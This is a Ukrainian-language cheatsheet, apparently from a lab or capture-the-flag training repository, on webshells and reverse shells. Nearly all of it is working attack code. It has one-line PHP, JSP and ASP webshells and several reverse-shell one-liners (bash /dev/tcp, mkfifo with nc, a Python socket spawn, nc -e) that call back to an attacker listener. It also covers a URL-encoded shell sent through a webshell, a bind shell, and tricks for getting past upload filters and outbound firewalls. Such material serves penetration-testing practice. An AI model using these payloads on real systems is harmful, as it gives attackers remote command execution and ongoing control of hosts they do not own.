# Cheatsheet: Webshells & Reverse Shells

Від webshell до інтерактивного shell. ← [initial-access](../01-roadmaps/initial-access.md) · [netcat](netcat-socat.md)

> Listener має бути там, де піднятий VPN (у віртуалці, якщо VPN у віртуалці), і на адресі `10.8.N.x`, не на localhost.

## Мінімальний PHP webshell
```php
<?php system($_GET['c']); ?>
```
Виклик: `http://$TARGET/shell.php?c=id`
Захищений ключем (щоб інші команди не користувались):
```php
<?php if($_GET['k']==='s3cret') system($_GET['c']); ?>
```
Виклик: `http://$TARGET/shell.php?k=s3cret&c=ls`

## Інші однорядкові
```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>   <!-- JSP -->
```
```asp
<% eval request("c") %>                                        <!-- ASP -->
```

## Reverse shells (ціль → локальна машина)
Спершу `nc -lvnp 4444` локально. Потім на цілі один із:
```bash
# bash
bash -i >& /dev/tcp/10.8.N.x/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.8.N.x/4444 0>&1'
# mkfifo (коли nc без -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.N.x 4444 >/tmp/f
# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.8.N.x",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
# nc (з -e, рідко)
nc -e /bin/bash 10.8.N.x 4444
# socat (повний TTY) — див. netcat-socat.md
```
URL-encoded через webshell:
```
http://$TARGET/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.N.x/4444+0>%261'
```

## Стабілізація (одразу після connect)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm
```

## Bind shell (коли reverse не доходить)
```bash
# ціль:     nc -lvnp 4445 -e /bin/bash     (або mkfifo-варіант)
# локально: nc $TARGET 4445
```

## Пастки
- Немає bash → `sh`, `python`, `perl`, `nc`, `/dev/tcp`.
- Вихідний фаєрвол → порти 80/443.
- Upload не бере `.php` → `.phtml`, `.php5`, зміна `Content-Type`, подвійне розширення `shell.php.jpg`.
